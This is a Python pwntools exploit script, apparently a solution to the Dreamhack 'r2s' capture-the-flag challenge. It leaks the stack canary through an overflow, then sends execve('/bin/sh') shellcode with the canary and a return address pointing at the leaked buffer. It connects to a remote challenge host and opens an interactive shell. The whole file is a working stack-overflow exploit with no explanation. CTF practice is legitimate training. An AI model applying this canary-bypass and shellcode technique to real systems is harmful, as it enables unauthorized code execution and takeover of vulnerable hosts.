#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./r2s', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main+154
b *main+239
b *main+269
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 8547)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})


shellcode = asm(
    '''
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
    ''', arch = 'amd64', os = 'linux')

padding_canary = 0x58
padding_return = 0x68
leak_canary = b'a' * (padding_canary - 4) + b'LEAK:'

io = start()

io.recvuntil(b'Address of the buf: ')
buf = int(io.recvline(), 16)
success(f"buf @ {hex(buf)}")
io.recvuntil(b'Input: ')
s(leak_canary)

io.recvuntil(b'LEAK:')
canary = unpack(b'\x00' + io.recvn(7))
success(f"canary @ {hex(canary)}")

payload = shellcode + b'a' * (padding_canary - len(shellcode)) + pack(canary) + b'a' * (padding_return - padding_canary - 8) + pack(buf)
io.recvuntil(b'Input: ')
sl(payload)
io.interactive()